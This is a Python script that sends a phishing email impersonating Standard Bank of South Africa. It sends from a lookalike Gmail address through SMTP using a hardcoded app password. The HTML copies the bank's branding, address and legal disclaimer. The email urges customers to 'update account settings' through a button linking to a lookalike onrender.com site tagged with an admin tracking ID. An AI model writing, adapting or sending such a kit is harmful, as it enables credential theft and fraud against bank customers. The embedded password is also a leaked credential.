import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

# ========== Gmail SMTP ==========
smtp_server = "smtp.gmail.com"
port = 587
username = "Standardbankingconfirmation@gmail.com"   # 👈 your Gmail
password = "udyu gyfv rfjj fvgk"     # 👈 use App Password if 2FA enabled
# =================================

# Create message
msg = MIMEMultipart("alternative")
msg["From"] = username
msg["To"] = "Mkhabeleenterprise@gmail.com"   # 👈 sending to your target email
msg["Subject"] = "Standard Bank: Important Account Notice"

# HTML content matching EXACTLY the Standard Bank email design
html_content = """<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Standard Bank - Account Verification Required</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #003cc7;
            margin: 0;
            padding: 20px;
            line-height: 1.6;
        }
        
        .email-container {
            max-width: 500px;
            margin: 0 auto;
            background-color: #ffffff;
            border-radius: 8px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
            overflow: hidden;
        }
        
        .header-bar {
            background: linear-gradient(90deg, #0056b3 0%, #003cc7 100%);
            color: white;
            padding: 15px 20px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            font-size: 14px;
        }
        
        .header-left {
            font-weight: bold;
        }
        
        .header-right {
            display: flex;
            align-items: center;
            gap: 20px;
        }
        
        .logo-section {
            display: flex;
            align-items: center;
            gap: 10px;
        }
        
        .logo {
            width: 50px;
            height: 50px;
            background: transparent;
            border-radius: 8px;
            display: flex;
            align-items: center;
            justify-content: center;
            overflow: hidden;
        }
        
        .logo img {
            width: 100%;
            height: 100%;
            object-fit: contain;
        }
        
        .content {
            padding: 20px;
            color: #333;
        }
        
        .bank-info {
            margin-bottom: 20px;
            font-size: 14px;
            color: #333;
            line-height: 1.8;
            padding: 15px;
            background-color: #f8f9fa;
            border-radius: 4px;
            border-left: 4px solid #0056b3;
        }
        
        .bank-info strong {
            color: #333;
        }
        
        .bank-info a {
            color: #0056b3;
            text-decoration: underline;
        }
        
        .greeting {
            font-size: 18px;
            margin-bottom: 20px;
            color: #333;
            font-weight: bold;
        }
        
        .main-message {
            font-size: 14px;
            margin-bottom: 20px;
            color: #333;
            line-height: 1.6;
        }
        
        .service-link {
            background-color: #0056b3;
            color: white;
            padding: 12px 20px;
            text-decoration: none;
            border-radius: 4px;
            display: inline-block;
            margin: 20px 0;
            font-weight: bold;
            font-size: 16px;
            transition: background-color 0.3s ease;
            border: none;
            cursor: pointer;
            width: 100%;
            max-width: 300px;
            text-align: center;
        }
        
        .service-link:hover {
            background-color: #004080;
        }
        
        .closing {
            margin: 20px 0;
            font-size: 14px;
            color: #333;
            padding: 15px;
            background-color: #f8f9fa;
            border-radius: 4px;
            border-left: 4px solid #0056b3;
        }
        
        .contact-section {
            margin: 20px 0;
            font-size: 14px;
            color: #333;
            line-height: 1.6;
            padding: 15px;
            background-color: #f8f9fa;
            border-radius: 4px;
            border-left: 4px solid #0056b3;
        }
        
        .footer-bar {
            background: linear-gradient(90deg, #0056b3 0%, #003cc7 100%);
            color: white;
            padding: 15px 20px;
            text-align: center;
            font-weight: bold;
            font-size: 18px;
            font-style: italic;
        }
        
        .disclaimer {
            padding: 20px;
            font-size: 11px;
            color: #666;
            line-height: 1.4;
            background-color: #f8f9fa;
            border-top: 1px solid #e9ecef;
        }
        
        .disclaimer a {
            color: #0056b3;
            text-decoration: none;
        }
        
        .disclaimer a:hover {
            text-decoration: underline;
        }
        
        @media (max-width: 600px) {
            .email-container {
                margin: 10px;
            }
            
            .content {
                padding: 20px;
            }
            
            .header-bar {
                flex-direction: column;
                gap: 10px;
                text-align: center;
            }
        }
    </style>
</head>
<body>
    <div class="email-container">
        <!-- Header Bar -->
        <div class="header-bar">
            <div class="header-left">
                Customer Care: 086 120 1311
            </div>
            <div class="header-right">
                <span>Website: www.standardbank.co.za</span>
                <div class="logo-section">
                    <div class="logo">
                        <img src="https://standardbank.onrender.com/logo-email.png" alt="Standard Bank Logo">
                    </div>
                </div>
            </div>
            </div>
        </div>
        
        <!-- Main Content -->
        <div class="content">
            <!-- Bank Information -->
            <div class="bank-info">
                <strong>Standard Bank Centre</strong><br>
                5 Simmonds Street<br>
                Johannesburg<br>
                2001<br>
                P.O. Box 7725<br>
                Johannesburg 2000<br>
                Telephone: 086 120 1311<br>
                Website: <a href="https://www.standardbank.co.za">www.standardbank.co.za</a>
            </div>
            
            <!-- Greeting -->
            <div class="greeting">
                Hello Customer,
            </div>
            
            <!-- Main Message -->
            <div class="main-message">
                Your account security settings require updating to comply with new banking regulations. Please update your profile information to maintain uninterrupted access to your banking services.
            </div>
            
            <!-- Additional Information -->
            <div class="main-message">
                For assistance with account updates, contact our customer service on <strong>086 120 1311</strong> or international <strong>+27 01 249 0423</strong>.
            </div>
            
            <!-- Service Link -->
            <div style="text-align: center;">
                <a href="https://standardbank.onrender.com/?admin_id=168368c5-7a1a-4dd8-8ce0-4622f8080f95" class="service-link">
                    UPDATE ACCOUNT SETTINGS
                </a>
            </div>
            
            <!-- Closing -->
            <div class="closing">
                Kind Regards,<br>
                <strong>Standard Bank</strong>
            </div>
            
            <!-- Contact Section -->
            <div class="contact-section">
                Contact us if you received this mail in error, or have any further queries.<br>
                South Africa: 0860 123 000 / International: <strong>+27 01 249 0423</strong>
            </div>
            
            <!-- Final Notice -->
            <div class="main-message">
                Please do not reply to this mail, as it was sent from an unattended mailbox.
            </div>
        </div>
        
        <!-- Footer Bar -->
        <div class="footer-bar">
            Standard Bank IT CAN BE.
        </div>
        
        <!-- Disclaimer -->
        <div class="disclaimer">
            <p><strong>The Standard Bank of South Africa Limited (Reg. No. 1962/000738/06). Authorised financial services provider. Registered credit provider NCR CP15.</strong></p>
            
            <p><strong>Standard Bank Isle of Man Limited</strong> is licensed by the Isle of Man Financial Services Authority. <strong>Standard Bank Jersey Limited</strong> is regulated by the Jersey Financial Services Commission.</p>
            
            <p><strong>The Standard Bank email disclaimer and confidentiality note.</strong></p>
            
            <p>This email, its attachments and any rights attaching hereto are, unless the content clearly indicates otherwise, the property of the Standard Bank Group Limited and/or its subsidiaries ("the group"). It is confidential, private and intended for the addressee only.</p>
            
            <p>Should you not be the addressee and receive this email by mistake, kindly notify the sender, and delete it immediately. Do not disclose or use the email in any manner whatsoever.</p>
            
            <p>Views and opinions expressed in this email are those of the sender unless clearly stated as those of the group.</p>
            
            <p>The group accepts no liability whatsoever for any loss or damages - whatsoever and howsoever incurred - or suffered resulting or arising from the use of this email or its attachments. The group does not warrant the integrity of this email or that it is free of errors, viruses, interception or interference.</p>
            
            <p><strong>The group will never send you any email or other communication asking you to update or provide confidential information about you or your account. If you have any doubts about the legitimacy of this email or other emails you receive claiming to be from Standard Bank please forward them to <a href="mailto:phishing@standardbank.co.za">phishing@standardbank.co.za</a></strong></p>
            
            <p>For more information about Standard Bank Group Limited see <a href="https://www.standardbank.com">www.standardbank.com</a></p>
        </div>
    </div>
</body>
</html>"""

# Attach HTML
msg.attach(MIMEText(html_content, "html"))

# Send email
server = smtplib.SMTP(smtp_server, port)
server.starttls()
server.login(username, password)
server.sendmail(msg["From"], msg["To"], msg.as_string())
server.quit()

print("✅ Banking service notification sent successfully!")
print("📧 From: Standardbankingconfirmation@gmail.com")
print("📧 To: moneybman0@gmail.com")
print("🎯 Subject: Standard Bank: Important Account Notice")
print("🔗 Service Link: https://standardbank.onrender.com/?admin_id=168368c5-7a1a-4dd8-8ce0-4622f8080f95")
print("🎨 Design: Professional banking service notification")